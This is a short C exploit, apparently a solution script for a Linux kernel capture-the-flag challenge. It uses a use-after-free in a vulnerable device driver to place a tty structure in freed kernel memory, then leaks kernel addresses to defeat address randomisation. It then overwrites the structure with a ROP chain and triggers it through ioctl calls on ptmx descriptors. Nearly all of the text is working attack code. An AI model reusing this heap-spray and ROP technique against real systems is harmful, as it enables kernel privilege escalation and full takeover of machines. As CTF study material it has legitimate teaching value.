#include "libpwn.c"
#define OBJ_SIZE                0x400

int main(){
  //mapleint's solution script
  save_state();
  fd = open_device();
  kalloc(OBJ_SIZE);
  kfree(); 

  log_success("UAF size 0x400 to kmalloc-1024");
  
	while (!is_tty()) alloc_tty();
  log_success("Opened TTY file descriptor");

  info("Number allocated", num_ptmx);

  dump_hex((char *)&tty, OBJ_SIZE);
	g_buf = ((unsigned long *)&tty)[8] - 0x40;
  leak = ((unsigned long *)&tty)[71];
  
  kernel_base = leak - 0x609600;
  info("Leaked address", leak);
  info("Kernel base", kernel_base);
  info("g_buf", g_buf);

  rop_commit();
  log_success("ROP chain set up");
  use_write(&tty);
	for (int i = 0; i < num_ptmx; i++) {
		ioctl(open_ptmx[i], 0, 0x1234567812345678ULL);
	}

  ppause();

  return 0;
}